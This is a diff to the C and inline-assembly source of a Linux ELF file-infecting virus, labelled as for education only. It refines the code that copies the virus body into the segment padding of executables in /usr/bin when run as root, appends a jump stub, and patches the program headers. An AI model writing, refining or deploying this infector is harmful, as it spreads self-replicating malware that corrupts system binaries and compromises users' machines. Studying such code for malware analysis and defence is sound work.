@@ -6,6 +6,8 @@
  * EDUCATION PURPOSRES ONLY!
  */
 
+#define CODE_SIZE ((long)&&label2 - (long)&_start)
+
 #define SYS_READ	0
 #define SYS_WRITE	1
 #define SYS_OPEN	2
@@ -164,7 +166,7 @@ void _start(void)
 {
 	__asm__ __volatile__ (
 		/* handle stack manually.... yes this is fight agains compiler :( */
-		"add $0x8388, %rsp\n"
+		"add $0x8378, %rsp\n"
 		/* This is needed because if I don't do it,
 		 * then I will crash to glibc pointer protection.
 		 */
@@ -177,14 +179,12 @@ void _start(void)
 		"pushq %rbp\n"
 
 		/* allocate spack space for virus */
-		"sub $0x8388, %rsp\n"
+		"sub $0x8378, %rsp\n"
 	);
 
 	volatile Elf64_Ehdr ehdr;
 	volatile Elf64_Phdr phdr;
 	volatile Elf64_Phdr phdr_next;
-	unsigned long offset;
-	unsigned long real_code_size;
 	Elf64_Half p;
 	unsigned char jmp[27];
 
@@ -207,7 +207,7 @@ void _start(void)
 	jmp[0] = '\x48'; 
 	jmp[1] = '\x81';
 	jmp[2] = '\xc4';
-	jmp[3] = '\x88';
+	jmp[3] = '\x78';
 	jmp[4] = '\x83';
 	jmp[5] = '\x00';
 	jmp[6] = '\x00';
@@ -247,7 +247,6 @@ void _start(void)
 	dfd = -4096;
 
 	/* Count size of _start function of virus */
-	real_code_size = (long)&&label2 - (long)&_start;
 
 	/* Hooray! We are root! Go to /usr/bin dir! */
 	if (getuid() == 0) {
@@ -283,16 +282,15 @@ void _start(void)
 //back_to_loop:
 		nread = 0;
 		while((nread = getdents64(dfd, buf, sizeof(buf))) > 0) {
-			for (skip = 0; skip < nread; ) {
+			for (skip = 0; skip < nread; skip += d->d_reclen) {
 				d = (struct linux_dirent64 *)(buf +  skip);
 				/* We are, we are ... ugly as hell! */
 				if ((d->d_name[0] == '.' && d->d_name[1] == '\0')
 					|| (d->d_name[0] == '.' && d->d_name[1] == '.' && d->d_name[2] == '\0'))
-					{ skip += d->d_reclen; continue; }
+					{ continue; }
 				file_name = d->d_name;
 				goto infect;
-back_to_loop:
-				skip += d->d_reclen;
+back_to_loop: ;
 			}
 		}
 		close(dfd);
@@ -327,13 +325,12 @@ infect:
 		/* we have match! */
 		read(fd, &phdr_next, sizeof(phdr_next));
 
-		if ((phdr_next.p_offset - (phdr.p_offset + phdr.p_filesz) + sizeof(jmp)) < real_code_size) { continue; }
+		if ((phdr_next.p_offset - (phdr.p_offset + phdr.p_filesz) + sizeof(jmp)) < CODE_SIZE) { continue; }
 
 		/* Padding in victim */
-		offset = phdr.p_offset + phdr.p_filesz;
-		lseek(fd, offset, SEEK_SET);
+		lseek(fd, phdr.p_offset + phdr.p_filesz, SEEK_SET);
 		/* add code */
-		write(fd, (long)_start, real_code_size);
+		write(fd, (long)_start, CODE_SIZE);
 
 		/* some instructions after label2 are not copyed
 		 * so I use this space to add jump... and stack cleanup
@@ -347,10 +344,8 @@ infect:
 		write(fd, &ehdr, sizeof(ehdr));
 
 		/* change phdr */
-		phdr.p_filesz += real_code_size; 
-		phdr.p_filesz += sizeof(jmp); 
-		phdr.p_memsz += real_code_size;
-		phdr.p_memsz += sizeof(jmp); 
+		phdr.p_filesz += sizeof(jmp) + CODE_SIZE;
+		phdr.p_memsz += sizeof(jmp) + CODE_SIZE;
 		lseek(fd, ehdr.e_phoff + (p * sizeof(phdr)), SEEK_SET);
 		write(fd, &phdr, sizeof(phdr));
 		break;
